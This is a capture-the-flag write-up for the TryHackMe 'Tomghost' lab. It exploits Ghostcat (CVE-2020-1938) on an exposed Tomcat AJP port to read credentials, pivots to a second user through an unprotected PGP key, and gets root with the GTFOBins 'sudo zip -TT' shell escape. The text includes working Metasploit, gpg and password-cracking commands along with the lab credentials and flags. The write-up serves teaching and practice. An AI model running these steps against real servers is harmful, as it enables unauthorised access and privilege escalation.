# Tomghost — TryHackMe Writeup

> **Platform:** TryHackMe  
> **Difficulty:** Easy  
> **OS:** Linux (Ubuntu 16.04)  
> **Techniques:** Ghostcat (CVE-2020-1938), AJP Protocol Exploitation, PGP Decryption, Sudo Abuse  
> **Tags:** `AJP` `Ghostcat` `Tomcat` `PGP` `GTFOBins` `sudo`

---

## Overview

Tomghost is a room centered around **Ghostcat (CVE-2020-1938)** — a critical vulnerability in Apache Tomcat's AJP connector that allows unauthenticated file read from the web application directory. The attack chain involves exploiting the AJP service to extract credentials from `WEB-INF/web.xml`, SSH access, PGP decryption to pivot to a second user, and sudo abuse of the `zip` binary for root escalation.

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -T4 10.67.138.135
```

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
8080/tcp open  http       Apache Tomcat 9.0.30
```

**Key findings:**

- **SSH on port 22** — potential entry once credentials are obtained
- **Port 53 (tcpwrapped)** — service closes connection immediately, not exploitable
- **AJP on port 8009** — Apache JServ Protocol, a binary protocol for communication between a front-end web server and Tomcat. Should never be exposed externally
- **Tomcat 9.0.30 on port 8080** — version prior to 9.0.31, vulnerable to Ghostcat (CVE-2020-1938)

### Web Enumeration

```bash
gobuster dir -u http://10.67.138.135:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

```
/docs      (Status: 302) [--> /docs/]
/examples  (Status: 302) [--> /examples/]
/manager   (Status: 302) [--> /manager/]
```

Standard Tomcat directories, nothing custom. The `/manager` endpoint requires authentication. A second scan with file extensions (`-x php,html,txt,bak,zip,js`) only revealed `RELEASE-NOTES.txt` (Status: 200), confirming Tomcat version 9.0.30.

No exploitable web content found — the attack vector is the exposed AJP connector.

---

## Exploitation — Ghostcat (CVE-2020-1938)

### Vulnerability Background

**Ghostcat** affects Apache Tomcat versions before 9.0.31 (and equivalent branches). The AJP connector, designed for trusted internal communication between a reverse proxy (Apache/Nginx) and Tomcat, lacks authentication. When exposed to the network, an attacker can craft AJP requests with special servlet attributes:

```
javax.servlet.include.request_uri  = /
javax.servlet.include.path_info    = WEB-INF/web.xml
javax.servlet.include.servlet_path = /
```

These attributes instruct Tomcat to perform an internal file include, bypassing the Servlet Specification's protection that blocks direct HTTP access to `WEB-INF/` and `META-INF/` directories. Tomcat trusts these attributes because they are supposed to come from a trusted front-end server.

### Exploitation with Metasploit

```bash
msfconsole
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS 10.67.138.135
set AJP_PORT 8009
set FILENAME /WEB-INF/web.xml
run
```

**Result:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app ...>
  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
     skyfuck:8730281lkjlkjdqlksalks
  </description>
</web-app>
```

Credentials extracted directly from the application's deployment descriptor:

- **Username:** `skyfuck`
- **Password:** `8730281lkjlkjdqlksalks`

---

## Initial Access — SSH

```bash
ssh skyfuck@10.67.138.135
```

Login successful with the extracted credentials.

### User Flag

```bash
find / -name user.txt 2>/dev/null
cat /home/merlin/user.txt
```

```
THM{GhostCat_1s_so_cr4sy}
```

The user flag is in merlin's home directory, readable by all users.

---

## Lateral Movement — PGP Decryption

### Discovery

```bash
ls -la /home/skyfuck/
```

```
-rw-rw-r-- 1 skyfuck skyfuck  394 Mar 10  2020 credential.pgp
-rw-rw-r-- 1 skyfuck skyfuck 5144 Mar 10  2020 tryhackme.asc
```

Two interesting files:

- `tryhackme.asc` — PGP private key
- `credential.pgp` — PGP-encrypted message (likely contains credentials for another user)

### Decryption

```bash
gpg --import tryhackme.asc
gpg --decrypt credential.pgp
```

The private key had no passphrase, so decryption succeeded without cracking:

```
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

> **Note:** If the key had been passphrase-protected, the approach would be: transfer `tryhackme.asc` to the attacker machine → `gpg2john tryhackme.asc > hash.txt` → `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`.

### Pivoting to Merlin

```bash
su merlin
# Password: asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

---

## Privilege Escalation — Sudo Zip

### Enumeration

```bash
sudo -l
```

```
User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

The presence of `.sudo_as_admin_successful` in merlin's home directory already hinted at sudo privileges.

### Exploitation via GTFOBins

Reference: [https://gtfobins.github.io/gtfobins/zip/](https://gtfobins.github.io/gtfobins/zip/)

The `zip` binary supports a `-T` (test) flag with a custom test command via `-TT`. When run with sudo, the test command executes as root:

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

**Breakdown:**

- `mktemp -u` — generates a temporary filename without creating the file
- `zip $TF /etc/hosts` — creates a zip archive (needs a valid file to archive)
- `-T` — tells zip to test the archive after creation
- `-TT 'sh #'` — specifies `sh` as the test command; `#` comments out the rest of the argument line

### Root Flag

```bash
whoami
# root
cat /root/root.txt
```

```
THM{Z1P_1S_FAKE}
```

---

## Attack Chain Summary

```
Nmap Scan
    │
    ├── Port 8009: AJP (Apache Jserv Protocol v1.3)
    └── Port 8080: Apache Tomcat 9.0.30
            │
            ▼
    Ghostcat (CVE-2020-1938)
    Read WEB-INF/web.xml via Metasploit
            │
            ▼
    Credentials: skyfuck:8730281lkjlkjdqlksalks
            │
            ▼
    SSH as skyfuck
            │
            ▼
    PGP key + encrypted credential.pgp
    gpg --import + --decrypt (no passphrase)
            │
            ▼
    Credentials: merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
            │
            ▼
    su merlin → sudo -l → /usr/bin/zip NOPASSWD
            │
            ▼
    GTFOBins: sudo zip -T -TT 'sh #'
            │
            ▼
        ROOT
```

---

## Key Takeaways

1. **AJP exposed = Ghostcat check.** Any time you see port 8009 (ajp13) open with Tomcat < 9.0.31, test for CVE-2020-1938. The AJP protocol was designed for trusted internal communication and has no authentication — it should never be exposed to untrusted networks.

2. **WEB-INF/web.xml is the first target.** The deployment descriptor often contains credentials, database connection strings, or references to other sensitive configuration files. The Servlet Specification protects this directory from HTTP access, but AJP bypasses that protection entirely.

3. **PGP keys aren't always passphrase-protected.** Always try importing and decrypting before spending time on cracking. If cracking is needed, `gpg2john` extracts the hash for John the Ripper.

4. **GTFOBins is essential for sudo privesc.** After `sudo -l`, immediately check [GTFOBins](https://gtfobins.github.io/) for the allowed binary. Many standard utilities (zip, tar, find, vim, etc.) can spawn shells when run with elevated privileges.

5. **Lateral movement through encrypted files.** PGP/GPG-encrypted credentials on disk are a common CTF pattern. In real engagements, look for `.pgp`, `.gpg`, `.asc`, `.pem` files in user home directories — they often contain credentials for other accounts or services.
